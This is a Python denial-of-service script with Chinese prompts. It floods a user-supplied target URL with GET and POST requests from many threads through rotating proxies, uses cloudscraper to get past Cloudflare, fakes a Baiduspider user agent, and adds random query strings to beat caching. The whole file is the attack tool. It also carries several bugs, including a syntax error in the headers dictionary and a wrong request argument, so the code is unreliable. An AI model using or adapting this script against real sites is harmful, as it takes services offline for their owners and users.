import os
import random
import time
import requests
import threading
import cloudscraper
from colorama import Fore

def random_parameters(url):
    items = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k',
             'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
    temp = ""
    random_str = temp.join(random.sample(items, 10))
    if url.find('?') >= 0:
        url = url + "&_random=" + random_str
    else:
        url = url + "?_random=" + random_str
    return url

def opth():
	for a in range(thr):
		x = threading.Thread(target=atk)
		x.start()
		print("Threads " + str(a+1) + " Created ")
	print(Fore.RED + "正在展开线程")
	time.sleep(5)
	input(Fore.CYAN + "按下回车发动打击")
	global oo
	oo = True

oo = False

def main():
	global url
	global list
	global pprr
	global thr
	global per
	url = str(input(Fore.GREEN + "目标地址 : " + Fore.WHITE))
	list = str(input(Fore.GREEN + "代理列表 (proxy.txt) : " + Fore.WHITE))
	pprr = open(list).readlines()
	print(Fore.GREEN + "proxy总数 : " + Fore.WHITE + "%d" %len(pprr))
	thr = int(input(Fore.GREEN + "线程 (1-1000 Default Is 400) : " + Fore.WHITE))

	opth()

#http headers
headers = {
"User-Agent": "Mozilla/5.0 (compatible; Baiduspider/2.0; http://www.baidu.com/search/spider.html)",
"Referer": "http://www.baidu.com/search/spider.html",
"Cache-Control": "no-cache"
"Connection": "Keep-Alive"
}

def atk():
	pprr = open(list).readlines()
	proxy = random.choice(pprr).strip().split(":")
	s = cloudscraper.create_scraper()
	s.proxies = {}
	s.proxies['http'] = 'http://'+str(proxy[0])+":"+str(proxy[1])
	s.proxies['https'] = 'https://'+str(proxy[0])+":"+str(proxy[1])
	time.sleep(10)
	while True:
		while oo:
			try:
				url = random_parameters(url)
				print(len(url))
				s.get(url,header=header)
				s.post(url,header=header)
				print(Fore.CYAN + '代理 ----> ' + Fore.WHITE +Fore.WHITE+ str(proxy[0])+":"+str(proxy[1]) +Fore.CYAN+ ' ---> hit ---> ' +Fore.GREEN + str(url) + url)
			except:
				s.close()
				#print(Fore.RED + "目标或这个代理挂了！")


if __name__ == "__main__":
	main()
